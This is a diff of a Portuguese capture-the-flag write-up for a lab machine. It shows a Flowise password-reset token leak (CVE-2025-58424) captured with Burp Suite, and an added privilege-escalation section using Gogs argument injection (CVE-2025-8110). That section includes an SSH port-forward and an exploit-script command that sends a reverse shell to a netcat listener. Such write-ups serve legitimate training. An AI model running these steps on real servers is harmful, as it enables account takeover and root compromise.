@@ -8,7 +8,7 @@ Comecei a enumeração fazendo uma varredura de portas com o nmap para identific
 
 Descobrimos uma aplicação web em execução, então comecei a enumerar o serviço. Encontrei um possível user na aba de "colaboradores" da página principal: "Ben".
 
-Tentei descobrir diretórios ocultos com o gobuster, mas não encontrei na relevante para nós, então, enumerei os subdomínios diponíveis.
+Tentei descobrir diretórios ocultos com o gobuster, mas não encontrei nada relevantes, então, enumerei os subdomínios diponíveis.
 
 <img width="1124" height="276" alt="gobuster" src="https://github.com/user-attachments/assets/3e581dad-57ad-4bc7-90b3-d53ea4d7b66d" />
 
@@ -18,11 +18,11 @@ Acessando o subdomínio descoberto (staging.silentium.htb), descobri que se trat
 
 Acessei o path /api/v1/version para checar se deixaram a versão do sistema exposta e descobri que a versão do flowise é "3.0.5".  
 
-Essa versão do flowise é vulnerável ao CVE-2025-58424, que evidencia expõe dados sensíveis no endpoint /api/v1/forgot-password. Quando o usuário pede para recuperar a senha através do email, o servidor responde com um JSON contendo um tempToken(Que deveria somente ir ao email do user).
+Essa versão do flowise é vulnerável ao CVE-2025-58424, que expõe dados sensíveis no endpoint /api/v1/forgot-password. Quando o usuário pede para recuperar a senha através do email, o servidor responde com um JSON contendo um tempToken(Que deveria somente ir ao email do user).
 
 ## Exploração
 
-Sabendo do CVE, interceptei as requisições do forgot-password com o burpsuit e consegui o token temporário para alterar a senha através da resposta do servidor.
+Sabendo do CVE, interceptei as requisições ao forgot-password com o burpsuit e consegui o token temporário para alterar a senha através da resposta do servidor.
 
 <img width="1108" height="505" alt="token" src="https://github.com/user-attachments/assets/91e4ebcc-c551-4df0-9a62-3a552b32b79b" />
 
@@ -60,6 +60,28 @@ Testando a senha encontrada no serviço SSH com o user "Ben", consegui entrar na
 <img width="565" height="104" alt="userflag" src="https://github.com/user-attachments/assets/e641300d-6c05-408a-9791-813e5e72e3bd" />
 
 ## Escalação de privilégio
+
+Enumerando o ambiente, percebi a execução do serviço "Gogs" no localhost.  
+
+O Gogs quando possui uma versão desatualizada pode ser vulnerável a CVE-2025-8110 que é uma falha de injeção de argumentos que pode ser usada para escalar privilégios se estiver sendo executado com root. Nessa CVE, o Gogs permite que as configurações do git fossem manipuladas através de repositórios maliciosos.  
+
+Para acessar o Gogs rodando como localhost no alvo, precisei fazer um portforwarding:
+
+```bash
+ssh -L 3001:127.0.0.1:3001 ben@<ipAlvo>
+```
+Criei um login no Gogs, extraí a api key e abri um listener na porta 5555 utilizando o netcat.
+  
+Utilizei um script em python que automatiza a injeção de argumento:
+```bash
+python3 exploit.py -u http://localhost:3001 -un [YOUR_USERNAME] -pw [YOUR_PASSWORD] -t SEU_TOKEN_AQUI -lh [IP] -lp 5555
+```
+
+Conseguindo um shell root, extraindo a root flag e finalizando a máquina.
+<img width="267" height="109" alt="rootflag" src="https://github.com/user-attachments/assets/bfe27004-d52d-4f8d-b195-205f210e3641" />
+
+
+
 
 
 
